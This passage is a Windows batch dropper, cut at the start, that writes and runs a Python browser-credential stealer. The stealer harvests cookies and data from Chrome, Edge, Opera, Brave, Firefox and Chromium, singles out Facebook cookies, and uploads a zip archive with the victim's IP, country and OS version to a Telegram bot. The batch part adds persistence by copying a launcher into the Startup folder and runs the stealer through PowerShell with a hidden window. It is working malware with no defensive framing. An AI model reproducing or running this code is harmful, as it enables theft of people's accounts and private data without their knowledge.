echo             host = item["host"]>>C:\\Users\\Public\\stub.py
echo             name = item["name"]>>C:\\Users\\Public\\stub.py
echo             value = item["value"]>>C:\\Users\\Public\\stub.py
echo             if host == ".facebook.com":>>C:\\Users\\Public\\stub.py
echo                 result.append(f"{name} = {value}")>>C:\\Users\\Public\\stub.py
echo             cookie = f"{host}\t\t{'/'}\t\t\t{name}\t{value}\n"          >>C:\\Users\\Public\\stub.py
echo             with open((os.path.join(path_f, "cookie.txt")), 'a') as f:>>C:\\Users\\Public\\stub.py
echo                 f.write(cookie)>>C:\\Users\\Public\\stub.py
echo     except:>>C:\\Users\\Public\\stub.py
echo         print("")>>C:\\Users\\Public\\stub.py
echo def delete_firefox(data_firefox_profile):>>C:\\Users\\Public\\stub.py
echo     try:>>C:\\Users\\Public\\stub.py
echo         encrypt_firefox(data_firefox_profile)>>C:\\Users\\Public\\stub.py
echo     except: print("")>>C:\\Users\\Public\\stub.py
echo def intNumbers() :>>C:\\Users\\Public\\stub.py
echo     path_demso = r"C:\Users\Public\number.txt">>C:\\Users\\Public\\stub.py
echo     if os.path.exists(path_demso):>>C:\\Users\\Public\\stub.py
echo         with open(path_demso, 'r') as file:>>C:\\Users\\Public\\stub.py
echo             number = file.read()>>C:\\Users\\Public\\stub.py
echo         number = int(number)+1>>C:\\Users\\Public\\stub.py
echo         with open(path_demso, 'w') as file:>>C:\\Users\\Public\\stub.py
echo             abc = str(number)>>C:\\Users\\Public\\stub.py
echo             file.write(abc)>>C:\\Users\\Public\\stub.py
echo     else:>>C:\\Users\\Public\\stub.py
echo         with open(path_demso, 'w') as file:>>C:\\Users\\Public\\stub.py
echo             file.write("1")>>C:\\Users\\Public\\stub.py
echo             number = ^1>>C:\\Users\\Public\\stub.py
echo     return number>>C:\\Users\\Public\\stub.py
echo def get_browser_data(data_path, browser_path, browser_name):>>C:\\Users\\Public\\stub.py
echo     try:>>C:\\Users\\Public\\stub.py
echo         if os.path.exists(browser_path):>>C:\\Users\\Public\\stub.py
echo             if browser_name == 'chrome':>>C:\\Users\\Public\\stub.py
echo                 get_chrome(data_path, browser_path)>>C:\\Users\\Public\\stub.py
echo             elif browser_name == 'Edge':>>C:\\Users\\Public\\stub.py
echo                 get_edge(data_path, browser_path)>>C:\\Users\\Public\\stub.py
echo             elif browser_name == 'Opera':>>C:\\Users\\Public\\stub.py
echo                 get_opera(data_path, browser_path)>>C:\\Users\\Public\\stub.py
echo             elif browser_name == 'Brave':>>C:\\Users\\Public\\stub.py
echo                 get_brave(data_path, browser_path)>>C:\\Users\\Public\\stub.py
echo             elif browser_name == 'firefox':>>C:\\Users\\Public\\stub.py
echo                 get_firefox(data_path, browser_path)>>C:\\Users\\Public\\stub.py
echo             elif browser_name == 'chromium':>>C:\\Users\\Public\\stub.py
echo                 get_chromium(data_path, browser_path)>>C:\\Users\\Public\\stub.py
echo     except Exception as e:>>C:\\Users\\Public\\stub.py
echo         print(f"Error extracting data from {browser_name}: {str(e)}")>>C:\\Users\\Public\\stub.py
echo def main():>>C:\\Users\\Public\\stub.py
echo     numbers=intNumbers()>>C:\\Users\\Public\\stub.py
echo     number = "Status number send: " + str(numbers)>>C:\\Users\\Public\\stub.py
echo     u2 = 'https://api.telegram.org/bot'+apibot2+'/sendDocument'>>C:\\Users\\Public\\stub.py
echo     u1 = 'https://api.telegram.org/bot'+apibot1+'/sendDocument'>>C:\\Users\\Public\\stub.py
echo     browsers = {>>C:\\Users\\Public\\stub.py
echo         'chrome': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),>>C:\\Users\\Public\\stub.py
echo         'Edge': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),>>C:\\Users\\Public\\stub.py
echo         'Opera': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable"),>>C:\\Users\\Public\\stub.py
echo         'Brave': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),>>C:\\Users\\Public\\stub.py
echo         'firefox': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),>>C:\\Users\\Public\\stub.py
echo         'chromium': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data")>>C:\\Users\\Public\\stub.py
echo     }>>C:\\Users\\Public\\stub.py
echo     data_path = os.path.join(os.environ["TEMP"], name_f)>>C:\\Users\\Public\\stub.py
echo     os.mkdir(data_path)>>C:\\Users\\Public\\stub.py
echo     data_path_ck = os.path.join(os.environ["TEMP"], name_f, "filecookie")>>C:\\Users\\Public\\stub.py
echo     os.mkdir(data_path_ck)>>C:\\Users\\Public\\stub.py
echo     for browser_name, browser_path in browsers.items():>>C:\\Users\\Public\\stub.py
echo         get_browser_data(data_path, browser_path, browser_name)>>C:\\Users\\Public\\stub.py
echo     zip_file_path = os.path.join(os.environ["TEMP"], name_f + '.zip')>>C:\\Users\\Public\\stub.py
echo     shutil.make_archive(zip_file_path[:-4], 'zip', data_path)>>C:\\Users\\Public\\stub.py
echo     if numbers == 1:>>C:\\Users\\Public\\stub.py
echo         with open(zip_file_path, 'rb') as f:>>C:\\Users\\Public\\stub.py
echo             requests.post(u1,data={'caption': "\n"+"Country : "+name_country + "-" + timezone + "\n"+ windows_version +"\r\nIPAdress:"+ip + "\r\n"+ number,'chat_id': id1},files={'document': f})>>C:\\Users\\Public\\stub.py
echo     else : >>C:\\Users\\Public\\stub.py
echo         with open(zip_file_path, 'rb') as f:>>C:\\Users\\Public\\stub.py
echo             requests.post(u2,data={'caption': "\n"+"Country :  "+ name_country + "-" + timezone +"\n"+ windows_version +"\r\nIPAddress:"+ip + "\r\n"+ number,'chat_id': id2},files={'document': f})>>C:\\Users\\Public\\stub.py
echo     shutil.rmtree(data_path, ignore_errors=True)>>C:\\Users\\Public\\stub.py
echo     try:>>C:\\Users\\Public\\stub.py
echo         os.remove(zip_file_path)>>C:\\Users\\Public\\stub.py
echo     except Exception as e:>>C:\\Users\\Public\\stub.py
echo         print("Error")>>C:\\Users\\Public\\stub.py
echo main()>>C:\\Users\\Public\\stub.py
setlocal enabledelayedexpansion
for /f %%i in ('echo %USERNAME%') do set user=%%i
echo cmd /c C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\Users\Public\Document\python.exe C:\Users\Public\stub.py;>>C:\\Users\\Public\\Windows.bat
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -command "Get-Content 'C:\\Users\\Public\\Windows.bat' | Set-Content 'C:\Users\!user!\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows.bat'"
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\stub.py;
